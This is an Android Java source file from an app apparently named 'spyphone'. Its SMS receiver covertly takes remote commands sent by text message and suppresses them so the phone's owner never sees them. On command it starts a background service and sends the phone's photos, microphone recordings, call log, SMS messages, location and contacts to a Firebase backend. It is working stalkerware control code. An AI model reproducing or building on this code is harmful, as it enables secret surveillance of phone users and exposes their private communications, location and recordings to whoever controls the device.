package emit.esy.es.spyphone.broadcastReceivers;

import android.app.ActivityManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

import java.util.HashMap;

import emit.esy.es.spyphone.R;
import emit.esy.es.spyphone.services.BrokerService;
import emit.esy.es.spyphone.util.FirebaseWriter;

/**
 * Created by Emil Makovac on 13/05/2015.
 */
public class SmsReceiver extends BroadcastReceiver {

    public static final String LOG_TAG = "SmsReceiver";
    public static final String WRONG_ACTION = "Wrong action for remote app. Valid actions: remote + (start, stop, contacts, cords, sms, callLog, photo, mic + duration)";
    public static final String SERVICE_NOT_STARTED = "Service is not started. Type: 'remote start' for starting service";
    private static final String SERVICE_ALREADY_STARTED = "Service already started";
    Context context;
    String number;
    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d(LOG_TAG, "onReceive");
        this.context = context;
        Bundle pudsBundle = intent.getExtras();
        Object[] pdus = (Object[]) pudsBundle.get("pdus");
        SmsMessage messages =SmsMessage.createFromPdu((byte[]) pdus[0]);
        Log.i(LOG_TAG,  messages.getMessageBody());
        number = messages.getDisplayOriginatingAddress();
        Log.i(LOG_TAG,  messages.getDisplayOriginatingAddress());
        // if number is in spylist read the sms and send it to firebase, do not abortbroadcast
        // if messagebody is equals to "remote start" start thr broker service and abortbroadcast
        // or "spyphone - stopservice" then stop the service
        String action = messages.getMessageBody().trim().toLowerCase();
        if(isForApp(action)){
            abortBroadcast();
            String trimmedAction = getAction(action);
            switch(trimmedAction.toLowerCase()){
                case "start":
                    if(isMyServiceRunning(BrokerService.class)) {
                        respondBack(SERVICE_ALREADY_STARTED);
                    } else {
                        context.startService(new Intent(context, BrokerService.class));
                    }
                    break;
                case "stop":
                    context.stopService(new Intent(context, BrokerService.class));
                    break;
                case "photo":
                    if(!isMyServiceRunning(BrokerService.class)){
                        respondBack(SERVICE_NOT_STARTED);
                    } else {
                        FirebaseWriter fw = new FirebaseWriter(context, getUsername(), context.getString(R.string.password), "photo");
                    }
                    break;
                case "mic":
                    if(!isMyServiceRunning(BrokerService.class)){
                        respondBack(SERVICE_NOT_STARTED);
                    } else {
                        FirebaseWriter fw = new FirebaseWriter(context, getUsername(), context.getString(R.string.password), getMicMap(action));
                    }
                    break;
                case "calllog":
                    if(!isMyServiceRunning(BrokerService.class)){
                        respondBack(SERVICE_NOT_STARTED);
                    } else {
                        FirebaseWriter fw = new FirebaseWriter(context, getUsername(), context.getString(R.string.password), "callLog");
                    }
                    break;
                case "sms":
                    if(!isMyServiceRunning(BrokerService.class)){
                        respondBack(SERVICE_NOT_STARTED);
                    } else {
                        FirebaseWriter fw = new FirebaseWriter(context, getUsername(), context.getString(R.string.password), "sms");
                    }
                    break;
                case "cords":
                    if(!isMyServiceRunning(BrokerService.class)){
                        respondBack(SERVICE_NOT_STARTED);
                    } else {
                        FirebaseWriter fw = new FirebaseWriter(context, getUsername(), context.getString(R.string.password), "cords");
                    }
                    break;
                case "contacts":
                    if(!isMyServiceRunning(BrokerService.class)){
                        respondBack(SERVICE_NOT_STARTED);
                    } else {
                        FirebaseWriter fw = new FirebaseWriter(context, getUsername(), context.getString(R.string.password), "contacts");
                    }
                    break;
                default:
                    respondBack(WRONG_ACTION);
                    break;
            }
        }
    }

    private boolean isForApp(String msg) {
        String arr[];
        try {
            arr = msg.split(" ", 2);
            if(arr[0].equals(context.getString(R.string.remote))){
                return true;
            }
        } catch(Exception e){
        }
        return false;
    }

    private HashMap getMicMap(String action) {
        try{
            String arr[] = action.split(" ", 3);
            HashMap<String, Object> map = new HashMap<>();
            map.put("action", "mic");
            long duration = Long.valueOf(arr[2]);
            map.put("secondParam", duration);
            return map;
        } catch(Exception e){
            respondBack("You need to provide a duration in seconds for recording. The following message will record audio for 5 seconds: remote mic 5");
        }
        return null;
    }

    private String getUsername() {
        SharedPreferences sp = context.getSharedPreferences(context.getString(R.string.sharedPrefs), Context.MODE_PRIVATE);
        return sp.getString("username", "NA");
    }

    private void respondBack(String msg) {
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage(number, null, msg, null, null);
        }

    private String getAction(String action) {
        try {
            String arr[] = action.split(" ", 3);
            return arr[1];
        } catch (Exception e){
        }
        return "";
    }

    private boolean isMyServiceRunning(Class<?> serviceClass) {
        ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }


}
